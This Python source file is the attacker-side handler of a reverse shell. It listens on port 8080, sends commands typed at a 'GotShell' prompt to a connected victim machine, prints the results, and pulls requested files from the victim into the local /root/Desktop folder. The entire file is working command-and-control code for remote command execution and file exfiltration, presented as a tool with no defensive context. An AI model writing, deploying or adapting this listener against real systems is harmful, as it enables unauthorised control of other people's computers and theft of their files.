import os
import socket

def transfer(connection, command):
    
    connection.send(command.encode())
    grab, path = command.split("-")
    f = open('/root/Desktop/'+path, 'wb')
    
    while True:
        bits = connection.recv(1024)
        
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])  
            f.close()
            print ('[+] Transfer completed ')
            break
        
        if 'File not found'.encode() in bits:
            print ('[-] Unable to find out the file')
            break
        
        f.write(bits)

def connectback():
    s = socket.socket()
    s.bind(("127.0.0.1", 8080))
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080')
    connection, addr = s.accept()
    print('[+]Got connection from', addr)

    while True:
        command = input("GotShell}> ")
        
        if 'exit' in command:
            connection.send('terminate'.encode())
            break
        
        elif 'get' in command:
            transfer(connection, command)
        
        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())
def main():
    connectback()
main()

